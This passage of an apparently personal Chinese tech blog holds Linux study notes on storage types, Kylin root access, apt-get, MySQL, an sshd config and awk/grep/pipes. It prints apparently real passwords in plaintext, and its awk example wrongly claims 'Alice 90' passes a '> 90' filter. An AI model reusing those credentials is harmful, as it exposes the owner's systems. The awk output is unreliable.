title="三者差异"></a>三者差异</h2><p>NAS、SAN和DAS是三种不同的存储解决方案，它们在架构、连接方式和应用场景等方面有所不同。</p><ol><li>架构和连接方式：<ul><li>NAS（Network Attached Storage）使用网络连接（如以太网）将存储设备连接到服务器或计算机，通过文件级别的协议（如NFS、CIFS/SMB）提供共享文件存储。</li><li>SAN（Storage Area Network）使用专用的高速网络连接（如光纤通道、以太网）将存储设备连接到服务器，提供块级别的存储访问，独立于服务器。</li><li>DAS（Direct Attached Storage）直接将存储设备（如硬盘驱动器）通过物理连接（如SATA、SAS）连接到服务器或计算机的存储控制器，提供直连式的存储访问。</li></ul></li><li>应用场景：<ul><li>NAS适用于需要共享文件存储的场景，如小型办公室、家庭网络，它提供简单易用的共享文件服务。</li><li>SAN适用于对存储性能和可扩展性要求较高的场景，如企业数据中心、虚拟化环境，它提供高性能、可靠的存储解决方案。</li><li>DAS适用于小规模的存储需求，如个人电脑、小型办公室，它提供简单、经济的存储解决方案。</li></ul></li><li>数据访问方式：<ul><li>NAS提供基于<strong>文件级别</strong>的访问，通过网络协议（如NFS、CIFS/SMB）访问共享文件。</li><li>SAN提供基于<strong>块级别</strong>的访问，将存储设备映射为逻辑卷（LUN），通过存储协议（如iSCSI、光纤通道）提供块级别的存储访问。</li><li>DAS提供<strong>直连式</strong>的存储访问，通过物理连接将存储设备连接到服务器或计算机的存储控制器，提供直接的存储访问。</li></ul></li></ol><p>总体而言，NAS适用于共享文件存储，SAN适用于高性能、可扩展的存储需求，DAS适用于简单、小规模的存储需求。选择适合的存储解决方案应根据具体的应用需求、性能要求和预算考虑。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kylin</title>
      <link href="/2023/12/04/Kylin/"/>
      <url>/2023/12/04/Kylin/</url>
      
        <content type="html"><![CDATA[<h2 id="root-password"><a href="#root-password" class="headerlink" title="root password"></a>root password</h2><p>银河麒麟系统（*#V10.1版本*）</p><p>切换为root</p><p>因为root密码会一直改变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kylin@kylin:~/桌面$sudo -i </span><br><span class="line">[sudo]kylin的密码：此处输入普通用户kylin的密码856413ASF</span><br><span class="line">root@kylin:~/桌面#</span><br></pre></td></tr></table></figure><p>允许以root用户的身份登录到系统，并使用root的环境变量和家目录</p><p><strong>apt-get指令管理安装包</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install XXX</span><br><span class="line">sudo apt-get remove XXX  卸载，值得注意的是，remove仅仅卸载软件，但是并不卸载配置文件</span><br><span class="line">sudo apt-get purge XXX   卸载指令，同时卸载相应的配置文件</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">sudo apt-get update     将所有包的来源更新，也就是提取最新的包信息</span><br><span class="line">sudo apt-get upgrade    一般执行在apt-get update之后，它的作用是将系统中旧版本的包升级成最新的，慎用！因为在linux下，由于大部分为非商业软件，所以稳定性并没有得到很好的验证</span><br></pre></td></tr></table></figure><p>PS：</p><p><code>sudo apt-get autoremove</code></p><p>在卸载软件的时候同时卸载那些当初作为依赖但是现在并不需要的包。</p><p>看起来非常完美的指令，但是建议慎用！！这条指令很可能将你要用的依赖包同时卸载，有时候你的安装包并没有通过apt-get指令来管理，apt-get管理工具不会加入这些包的信息，所以在检索包的依赖关系时可能出问题.</p><p>又或者是另一种情况：举个例子：在安装某个包时，这个包依赖git，但是git并非你主动下载的，而是作为依赖下载的，包安装完之后系统可能就会提示git作为依赖不再需要使用，它并不知道你是不是正在使用这个软件包。</p><p>源</p><p><code>/etc/apt/sources.list</code></p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p   <span class="comment">#登录mysql</span></span><br></pre></td></tr></table></figure><p>mysql passwd：856413</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;validate_password%&#x27;</span>;   #查看密码策略</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                        <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> validate_password.check_user_name    <span class="operator">|</span> <span class="keyword">ON</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> validate_password.dictionary_file    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> validate_password.length             <span class="operator">|</span> <span class="number">6</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> validate_password.mixed_case_count   <span class="operator">|</span> <span class="number">1</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> validate_password.number_count       <span class="operator">|</span> <span class="number">1</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> validate_password.policy             <span class="operator">|</span> LOW   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> validate_password.special_char_count <span class="operator">|</span> <span class="number">1</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+-------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;新密码&#x27;</span>;   #修改root密码</span><br></pre></td></tr></table></figure><p>查看mysql状态<code>service mysql status</code></p><p>退出<code>\q</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database dbname;  #创建dbname数据库</span><br><span class="line"><span class="keyword">show</span> databases;          #显示数据库</span><br><span class="line"><span class="keyword">show</span> tables;             #显示数据表</span><br><span class="line">use dbname; #选择dbname数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tablename(               #创建数据表</span><br><span class="line">column1 datatype constrains,</span><br><span class="line">    column2 datatype constrains,</span><br><span class="line">    ...</span><br><span class="line">)</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student( id <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">primary</span> key, name <span class="type">varchar</span>(<span class="number">30</span>), sex <span class="type">int</span>, phone_number <span class="type">varchar</span>(<span class="number">20</span>) );</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看所有对象的详细信息和注释（表、视图、函数等）:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>表、视图、字段的详细信息、注释说明</span><br><span class="line">#<span class="number">1.1</span>.表、视图</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables  <span class="keyword">where</span> table_schema <span class="keyword">in</span> (<span class="string">&#x27;test&#x27;</span>) <span class="keyword">order</span> <span class="keyword">by</span> table_schema,table_type,table_name;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.views   <span class="keyword">where</span> table_schema <span class="keyword">in</span> (<span class="string">&#x27;test&#x27;</span>) <span class="keyword">order</span> <span class="keyword">by</span> table_schema,table_name;</span><br><span class="line">#<span class="number">1.2</span>.字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="keyword">in</span> (<span class="string">&#x27;test&#x27;</span>) <span class="keyword">order</span> <span class="keyword">by</span> table_schema,table_name,ordinal_position;</span><br><span class="line">#<span class="number">2.</span>表、视图的字段简要信息</span><br><span class="line">#<span class="number">2.1</span>超级简要</span><br><span class="line"><span class="keyword">describe</span> student;               #非常简要</span><br><span class="line"><span class="keyword">describe</span> student_view;</span><br><span class="line">#<span class="number">2.2</span>.简要。比<span class="keyword">describe</span>多点</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> columns <span class="keyword">from</span> student;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> columns <span class="keyword">from</span> student_view;</span><br><span class="line">#<span class="number">3.</span>函数、存储过程</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.routines <span class="keyword">where</span> routine_schema <span class="keyword">in</span> (<span class="string">&#x27;test&#x27;</span>) <span class="keyword">order</span> <span class="keyword">by</span> routine_schema,routine_type,routine_name;</span><br><span class="line"></span><br><span class="line">#student,student_view,test</span><br></pre></td></tr></table></figure><p>查看所有对象DDL定义语句（表、视图、函数等）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.2</span>.查看所有对象DDL定义语句（表、视图、函数等）</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span>      student;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">view</span>       student_view;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">function</span>   get_stu_name;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">procedure</span>  my_procedure;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database   test;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span>space <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">user</span>       root;</span><br></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>虚拟机网络为NAT模式</p><p><code>sudo apt install openssh-server</code>——安装ssh</p><p><code>sudo service ssh restart</code>——重启ssh服务器</p><p><code>sudo vi /etc/ssh/sshd_config</code>——修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span><br><span class="line"></span><br><span class="line"># This is the sshd server system-wide configuration file.  See</span><br><span class="line"># sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><br><span class="line"></span><br><span class="line"># The strategy used for options in the default sshd_config shipped with</span><br><span class="line"># OpenSSH is to specify options with their default value where</span><br><span class="line"># possible, but leave them commented.  Uncommented options override the</span><br><span class="line"># default value.</span><br><span class="line"></span><br><span class="line">Include /etc/ssh/sshd_config.d/*.conf</span><br><span class="line"></span><br><span class="line">Port 22               #默认22端口</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">#HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">PermitRootLogin yes     #允许root用户通过SSH登录</span><br><span class="line">StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><br><span class="line">#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"></span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">#PasswordAuthentication yes</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"># Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"># some PAM modules and threads)</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"># Kerberos options</span><br><span class="line">#KerberosAuthentication no</span><br><span class="line">#KerberosOrLocalPasswd yes</span><br><span class="line">#KerberosTicketCleanup yes</span><br><span class="line">#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line"># GSSAPI options</span><br><span class="line">#GSSAPIAuthentication no</span><br><span class="line">#GSSAPICleanupCredentials yes</span><br><span class="line">#GSSAPIStrictAcceptorCheck yes</span><br><span class="line">#GSSAPIKeyExchange no</span><br><span class="line"></span><br><span class="line"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span><br><span class="line"># and session processing. If this is enabled, PAM authentication will</span><br><span class="line"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="line"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="line"># If you just want the PAM account and session checks to run without</span><br><span class="line"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#AllowAgentForwarding yes</span><br><span class="line">#AllowTcpForwarding yes</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding yes</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">PrintMotd no</span><br><span class="line">#PrintLastLog yes</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#UseDNS no</span><br><span class="line">#PidFile /var/run/sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># Allow client to pass locale environment variables</span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystem       sftp    /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#       X11Forwarding no</span><br><span class="line">#       AllowTcpForwarding no</span><br><span class="line">#       PermitTTY no</span><br><span class="line">#       ForceCommand cvs server</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看SSH服务状态是否正常运行<code>/etc/init.d/ssh status</code>或者<code>service ssh status</code></p><p>查看端口表<code>netstat -int</code>或者看<code>netstat -aptn | grep 22</code></p><p>nginx</p><p>tomcat</p><p>db2表空间不会自动增加，需要手动更改存储空间大小</p><h2 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h2><p>zookper、nginx、redis</p><p>NAS（Network Attached Storage）</p><p>MQ（Message Queue）</p><h2 id="awk、grep、sed"><a href="#awk、grep、sed" class="headerlink" title="awk、grep、sed"></a>awk、grep、sed</h2><p>awk、grep、sed是Linux三剑客，这三个工具经常被联合使用，可以实现强大的文本处理和数据处理功能。</p><ol><li><code>grep</code>：<code>grep</code>命令用于在文件中搜索指定的模式或文本。它可以根据正则表达式匹配文本，并输出匹配的行。<code>grep</code>命令支持多种选项，如忽略大小写、递归搜索、显示行号等。通过<code>grep</code>命令，可以快速筛选出包含特定模式的行，进行文本的过滤和查找。</li><li><code>sed</code>：<code>sed</code>命令是一个流式文本编辑器，用于对文本进行替换、删除、插入等操作。它通过读取输入流的方式，逐行处理文本，并输出处理后的结果。<code>sed</code>命令使用基于正则表达式的模式匹配和替换规则，可以对文本进行复杂的编辑操作。<code>sed</code>命令支持多种选项和命令，如替换、删除、插入、打印等，通过组合不同的命令和选项，可以实现对文本的灵活处理。</li><li><code>awk</code>：<code>awk</code>是一种强大的文本处理工具，它可以根据指定的模式和动作对文本进行处理和分析。<code>awk</code>命令将文本按行分割成字段，并提供了丰富的内置函数和语法，可以对字段进行操作和计算。<code>awk</code>命令的主要思想是基于模式和动作的规则，通过匹配模式来选择要执行的动作，从而实现对文本的处理。<code>awk</code>命令可以用于数据提取、数据转换、数据统计等多种用途。</li></ol><p>这三个工具的组合使用可以实现复杂的文本处理和数据处理任务。通常的使用方式是，先使用<code>grep</code>命令筛选出需要的行，然后使用<code>sed</code>命令对选定的行进行编辑和转换，最后使用<code>awk</code>命令对处理后的数据进行进一步的分析和计算。这种组合使用的方式可以大大提高文本处理的效率和灵活性，是Linux系统中非常重要和常用的工具集。</p><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p><code>awk</code> 是一种强大的文本处理工具，用于在文本文件中进行数据抽取和报告生成。它以逐行处理文本文件的方式工作，将每一行拆分为字段，然后执行用户定义的操作。以下是 <code>awk</code> 命令的一般语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;pattern &#123; action &#125;&#x27;</span> input-file</span><br></pre></td></tr></table></figure><ul><li><code>pattern</code> 是用于匹配行的模式。</li><li><code>&#123; action &#125;</code> 是在模式匹配时执行的操作。</li><li><code>input-file</code> 是输入的文本文件。</li></ul><p>这是一个简单的例子，假设有一个包含学生成绩的文本文件（grades.txt），每行格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Alice 90</span><br><span class="line">Bob 85</span><br><span class="line">Charlie 92</span><br></pre></td></tr></table></figure><p>现在，如果我们想输出分数超过 90 的学生，我们可以使用如下 <code>awk</code> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;$2 &gt; 90 &#123; print $1, $2 &#125;&#x27;</span> grades.txt</span><br></pre></td></tr></table></figure><p>这个命令的意思是，如果第二个字段（分数）大于 90，则打印第一个字段（学生姓名）和第二个字段（分数）。在这个例子中，它将输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Alice 90</span><br><span class="line">Charlie 92</span><br></pre></td></tr></table></figure><p>接下来，如果你有特定的问题或需求，可以提出来，我会尽力帮助你理解和使用 <code>awk</code> 命令。</p><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p><code>grep</code>(Global search Regular Expression and Print out the line)是一个在Linux和Unix系统上常用的命令行工具，<strong>用于在文件中搜索指定的模式或文本</strong>。<code>grep</code>命令的基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [options] pattern [file...]</span><br></pre></td></tr></table></figure><p>其中，<code>pattern</code>表示要搜索的模式或文本，<code>file</code>表示要在其中搜索的文件。如果不指定文件，则默认从标准输入中读取数据。</p><p><code>grep</code>命令的常用选项包括：</p><ul><li><code>-i</code>：忽略大小写，不区分大小写地搜索模式。</li><li><code>-r</code>：递归地搜索目录下的所有文件。</li><li><code>-n</code>：显示匹配行的行号。</li><li><code>-v</code>：反向匹配，只显示不匹配的行。</li><li><code>-l</code>：只显示包含匹配的文件名，而不显示匹配的具体行。</li><li><code>-w</code>：只匹配整个单词，而不是部分匹配。</li><li><code>-c</code>：只显示匹配的行数，而不显示具体匹配的内容。</li></ul><p><code>grep</code>命令的一些常见用法示例：</p><ol><li>在文件中搜索指定的模式：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;pattern&quot; file.txt</span><br></pre></td></tr></table></figure><ol start="2"><li>忽略大小写地搜索模式：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i &quot;pattern&quot; file.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>递归地搜索目录下的所有文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;pattern&quot; directory/</span><br></pre></td></tr></table></figure><ol start="4"><li>显示匹配行的行号：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;pattern&quot; file.txt</span><br></pre></td></tr></table></figure><ol start="5"><li>反向匹配，只显示不匹配的行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &quot;pattern&quot; file.txt</span><br></pre></td></tr></table></figure><ol start="6"><li>只显示包含匹配的文件名，而不显示匹配的具体行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -l &quot;pattern&quot; file.txt</span><br></pre></td></tr></table></figure><ol start="7"><li>只匹配整个单词，而不是部分匹配：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -w &quot;word&quot; file.txt</span><br></pre></td></tr></table></figure><ol start="8"><li>只显示匹配的行数，而不显示具体匹配的内容：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -c &quot;pattern&quot; file.txt</span><br></pre></td></tr></table></figure><p>以上是<code>grep</code>命令的一些常见用法，它可以帮助我们在文件中快速搜索和筛选出需要的内容。</p><h2 id=""><a href="#" class="headerlink" title="|"></a>|</h2><p>在Linux中，竖线符号（|）被称为管道符号（pipe），它用于将一个命令的输出作为另一个命令的输入。管道符号的功能是<strong>将前一个命令的输出传递给后一个命令进行处理</strong>，从而实现多个命令的组合和协作。</p><p>管道符号的用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure><p>其中，<code>command1</code>和<code>command2</code>是两个独立的命令。<code>command1</code>的输出会作为<code>command2</code>的输入进行处理。</p><p>管道符号的功能和用途如下：</p><ol><li>过滤和处理数据：通过管道符号，可以将一个命令的输出作为另一个命令的输入，从而实现对数据的过滤和处理。例如，可以使用<code>grep</code>命令过滤文件中的特定行，然后使用<code>awk</code>命令提取和处理这些行的数据。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep pattern file | awk &#x27;&#123; print $1 &#125;&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>实现命令的组合：通过管道符号，可以将多个命令组合在一起，实现更复杂的操作。每个命令都可以专注于自己的功能，通过管道符号将它们连接起来，以实现更复杂的任务。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2 | command3</span><br></pre></td></tr></table></figure><ol start="3"><li><p>提高效率和灵活性：使用管道符号可以将多个命令串联起来，每个命令只需关注自己的部分，从而提高效率和灵活性。可以根据需要随时添加、删除或修改命令，以满足不同的需求。</p></li><li><p>实现输入/输出重定向：通过管道符号，可以将命令的输出重定向到文件或其他设备中。例如，可以将命令的输出重定向到文件中保存，或者将命令的输出传递给其他程序进行处理。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2 &gt; output.txt</span><br></pre></td></tr></table></figure><p>总之，管道符号是Linux中非常强大和常用的功能，它可以将多个命令连接在一起，实现数据的过滤、处理和组合，提高效率和灵活性，同时也实现了输入/输出的重定向。</p><h1 id="用户、组"><a href="#用户、组" class="headerlink" title="用户、组"></a>用户、组</h1><h2 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h2><p><code>useradd</code> 命令是用于创建新用户的命令。下面是 <code>useradd</code> 命令的常用参数：</p><ul><li><code>-c</code>：用于指定用户的注释信息。</li><li><code>-d</code>：用于指定用户的家目录，默认值为 <code>/home/&lt;username&gt;</code>。</li><li><code>-e</code>：用于指定用户账号的失效日期，格式为 